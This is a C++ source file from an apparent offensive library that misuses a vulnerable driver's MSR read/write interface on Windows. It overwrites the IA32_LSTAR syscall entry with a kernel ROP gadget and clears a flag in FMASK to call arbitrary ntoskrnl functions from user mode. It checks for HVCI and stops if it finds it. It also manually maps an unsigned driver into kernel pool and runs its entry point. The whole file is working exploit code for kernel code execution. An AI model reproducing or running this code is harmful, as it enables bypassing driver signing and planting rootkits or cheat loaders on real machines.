#include "../msrkit.h"
#include <msrkit/bootstrap.h>
#include <msrkit/detail/gadget.h>
#include <msrkit/detail/pe.h>
#include <msrkit/detail/shellcode.h>
#include <msrkit/detail/constants.h>

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>

namespace MSRK
{
    class M_INTERNAL final
    {
        private:
            inline static HANDLE            Driver              = INVALID_HANDLE_VALUE;
            inline static bool              owned_driver        = false;
            inline static std::uint64_t     original_fmask      = 0;

            inline static std::uintptr_t    ntoskrnl             = 0;
            inline static HMODULE           ntoskrnl_local       = nullptr;

            inline static int               last_error           = MSRK_OK;
            inline static bool              initialized          = false;

            static std::uint64_t READ_MSR(std::uint32_t REGISTER)
            {
                MSR_IO_DATA IO = { REGISTER, 0, 0, 0 };
                DeviceIoControl(
                    Driver,
                    IOCTL_READ_MSR,
                    &IO, sizeof(IO),
                    &IO, sizeof(IO),
                    nullptr, nullptr
                );
                return IO.value;
            }

            static bool WRITE_MSR(std::uint32_t REGISTER, std::uint64_t VALUE)
            {
                MSR_IO_DATA IO = { REGISTER, VALUE, 0, 0 };
                return DeviceIoControl(
                    Driver,
                    IOCTL_WRITE_MSR,
                    &IO, sizeof(IO),
                    &IO, sizeof(IO),
                    nullptr, nullptr
                );
            }

            static bool HVCI_CHECK()
            {
                using NtQSI_t = NTSTATUS(NTAPI*)(ULONG, PVOID, ULONG, PULONG);
                static const auto QUERY_FUNCTION = (NtQSI_t)GetProcAddress(
                    GetModuleHandleW(L"ntdll.dll"),
                    "NtQuerySystemInformation"
                );

                struct { ULONG Length; ULONG Options; } CODE_INTEGRITY = { sizeof(CODE_INTEGRITY), 0 };
                ULONG RETURN_LENGTH = 0;
                return QUERY_FUNCTION(103, &CODE_INTEGRITY, sizeof(CODE_INTEGRITY), &RETURN_LENGTH) == 0
                    && (CODE_INTEGRITY.Options & 0x400);
            }

            static void SET_PRIORITY(_Out_ DWORD* PRIORITY_PROCESS, _Out_ int* PRIORITY_THREAD)
            {
                *PRIORITY_PROCESS = GetPriorityClass(GetCurrentProcess());
                *PRIORITY_THREAD  = GetThreadPriority(GetCurrentThread());
                SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
                SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
            }

            static void RESTORE_PRIORITY(DWORD PRIORITY_PROCESS, int PRIORITY_THREAD)
            {
                SetThreadPriority(GetCurrentThread(), PRIORITY_THREAD);
                SetPriorityClass(GetCurrentProcess(), PRIORITY_PROCESS);
            }

            friend class M_FUNCTION;
            friend class M_DRIVERMAP;
            friend bool  INIT(const char* DRIVER_PATH, HANDLE DRIVER_HANDLE);
            friend int   GET_LAST_ERROR(void);
            friend void  CLEANUP(void);
    };


    bool INIT(const char* DRIVER_PATH, HANDLE DRIVER_HANDLE)
    {
        if (M_INTERNAL::HVCI_CHECK())
        {
            M_INTERNAL::last_error = MSRK_ERR_HVCI;
            return false;
        }

        M_INTERNAL::owned_driver = !DRIVER_HANDLE;

        if (DRIVER_HANDLE)
        {
            M_INTERNAL::Driver = (HANDLE)DRIVER_HANDLE;
        }
        else
        {
            wchar_t WIDE_PATH[MAX_PATH];
            MultiByteToWideChar(CP_ACP, 0, DRIVER_PATH, -1, WIDE_PATH, MAX_PATH);

            M_INTERNAL::Driver = LOAD_DRIVER(WIDE_PATH);
        }

        IA32_LSTAR = M_INTERNAL::READ_MSR(MSR_IA32_LSTAR);

        if (!IA32_LSTAR)
        {
            M_INTERNAL::last_error = MSRK_ERR_LSTAR_READ;
            return false;
        }

        M_INTERNAL::ntoskrnl = M_PE::GET_NTOSKRNL_BASE();
        M_INTERNAL::ntoskrnl_local = LoadLibraryExA(
            "ntoskrnl.exe",
            nullptr,
            DONT_RESOLVE_DLL_REFERENCES
        );

        if (!detail::FIND_GADGETS((std::uintptr_t)M_INTERNAL::ntoskrnl_local, M_INTERNAL::ntoskrnl))
        {
            if (M_INTERNAL::ntoskrnl_local) FreeLibrary(M_INTERNAL::ntoskrnl_local);
            M_INTERNAL::ntoskrnl_local = nullptr;
            M_INTERNAL::last_error = MSRK_ERR_GADGETS;
            return false;
        }

        M_INTERNAL::original_fmask = M_INTERNAL::READ_MSR(MSR_IA32_FMASK);

        M_INTERNAL::initialized = true;
        return true;
    }

    int GET_LAST_ERROR()
    {
        return M_INTERNAL::last_error;
    }

    void CLEANUP()
    {
        if (M_INTERNAL::ntoskrnl_local)
        {
            FreeLibrary(M_INTERNAL::ntoskrnl_local);
        }
        if (M_INTERNAL::owned_driver)
        {
            CloseHandle(M_INTERNAL::Driver);
            UNLOAD_DRIVER();
        }

        M_INTERNAL::Driver              = INVALID_HANDLE_VALUE;
        M_INTERNAL::owned_driver        = false;
        M_INTERNAL::original_fmask      = 0;
        M_INTERNAL::ntoskrnl            = 0;
        M_INTERNAL::ntoskrnl_local      = nullptr;
        ENTRY_GADGET                    = 0;
        M_INTERNAL::last_error          = MSRK_OK;
        M_INTERNAL::initialized         = false;
    }

    void* M_FUNCTION::CALL_AT(std::uintptr_t ADDRESS_FUNCTION, const std::uint64_t* Args, int ARGS_COUNT)
    {
        if (!M_INTERNAL::initialized)
        {
            return nullptr;
        }

        CallTargetFn = ADDRESS_FUNCTION;
        CallArgCount = (std::uint64_t)ARGS_COUNT;
        CallArgsPtr  = (std::uintptr_t)Args;
        CallResult   = 0;

        DWORD SAVED_PRIORITY_CLASS;
        int SAVED_THREAD_PRIORITY;
        M_INTERNAL::SET_PRIORITY(&SAVED_PRIORITY_CLASS, &SAVED_THREAD_PRIORITY);

        GROUP_AFFINITY SAVED_AFFINITY = {}, PIN_AFFINITY = {};
        PIN_AFFINITY.Group = 0;
        PIN_AFFINITY.Mask  = 1;
        SetThreadGroupAffinity(GetCurrentThread(), &PIN_AFFINITY, &SAVED_AFFINITY);

        M_INTERNAL::WRITE_MSR(MSR_IA32_FMASK, M_INTERNAL::original_fmask &~ 0x40000ULL);
        M_INTERNAL::WRITE_MSR(MSR_IA32_LSTAR, ENTRY_GADGET);
        gate_entry();
        M_INTERNAL::WRITE_MSR(MSR_IA32_FMASK, M_INTERNAL::original_fmask);

        SetThreadGroupAffinity(GetCurrentThread(), &SAVED_AFFINITY, nullptr);
        M_INTERNAL::RESTORE_PRIORITY(SAVED_PRIORITY_CLASS, SAVED_THREAD_PRIORITY);

        return (void*)(std::uintptr_t)CallResult;
    }

    void* M_FUNCTION::CALL(const char* EXPORT_NAME, const std::uint64_t* Args, int ARGS_COUNT)
    {
        if (!M_INTERNAL::initialized)
        {
            return nullptr;
        }

        std::uintptr_t KERNEL_ADDRESS = 0;

        const auto PROC_ADDRESS = GetProcAddress(M_INTERNAL::ntoskrnl_local, EXPORT_NAME);

        if (PROC_ADDRESS)
        {
            KERNEL_ADDRESS = M_INTERNAL::ntoskrnl + ((std::uintptr_t)PROC_ADDRESS - (std::uintptr_t)M_INTERNAL::ntoskrnl_local);
        }

        if (!KERNEL_ADDRESS)
        {
            return nullptr;
        }

        return CALL_AT(KERNEL_ADDRESS, Args, ARGS_COUNT);
    }

    std::uintptr_t M_DRIVERMAP::MAP(const char* DRIVER_PATH, const std::uint64_t* Args, int ARGS_COUNT)
    {
        if (!M_INTERNAL::initialized)
        {
            return 0;
        }

        const HMODULE TEMP_MODULE = LoadLibraryExA(
            DRIVER_PATH,
            nullptr,
            DONT_RESOLVE_DLL_REFERENCES
        );

        if (!TEMP_MODULE)
        {
            return 0;
        }

        const auto DOS_HEADER = (PIMAGE_DOS_HEADER)TEMP_MODULE;
        const auto NT_HEADER  = (PIMAGE_NT_HEADERS64)((std::uintptr_t)TEMP_MODULE + DOS_HEADER->e_lfanew);
        const auto IMAGE_SIZE = (std::size_t)NT_HEADER->OptionalHeader.SizeOfImage;
        FreeLibrary(TEMP_MODULE);

        std::uint64_t ALLOC_ARGS[] = { 0, (std::uint64_t)IMAGE_SIZE, 0 };

        const auto POOL_ADDRESS = (std::uintptr_t)M_FUNCTION::CALL(
            "ExAllocatePoolWithTag",
            ALLOC_ARGS,
            3
        );

        if (!POOL_ADDRESS)
        {
            return 0;
        }

        PreparedImage PREPARED_IMAGE;

        if (!M_PE::PREPARE_IMAGE(DRIVER_PATH, POOL_ADDRESS, &PREPARED_IMAGE))
        {
            UNMAP(POOL_ADDRESS);
            return 0;
        }

        std::uint64_t COPY_ARGS[] = {
            POOL_ADDRESS,
            (std::uint64_t)PREPARED_IMAGE.data.data(),
            (std::uint64_t)PREPARED_IMAGE.image_size
        };
        M_FUNCTION::CALL("memcpy", COPY_ARGS, 3);

        if (ARGS_COUNT > 0 && Args)
        {
            M_FUNCTION::CALL_AT(POOL_ADDRESS + PREPARED_IMAGE.entry_rva, Args, ARGS_COUNT);
        }
        else
        {
            std::uint64_t DEFAULT_ARGS[] = { 0, 0 };
            M_FUNCTION::CALL_AT(POOL_ADDRESS + PREPARED_IMAGE.entry_rva, DEFAULT_ARGS, 2);
        }

        return POOL_ADDRESS;
    }

    void M_DRIVERMAP::UNMAP(std::uintptr_t BASE_ADDRESS)
    {
        if (!BASE_ADDRESS) return;
        std::uint64_t FREE_ARGS[] = { BASE_ADDRESS, 0 };
        M_FUNCTION::CALL("ExFreePoolWithTag", FREE_ARGS, 2);
    }

    void UNMAP(std::uintptr_t BASE_ADDRESS)
    {
        M_DRIVERMAP::UNMAP(BASE_ADDRESS);
    }

}
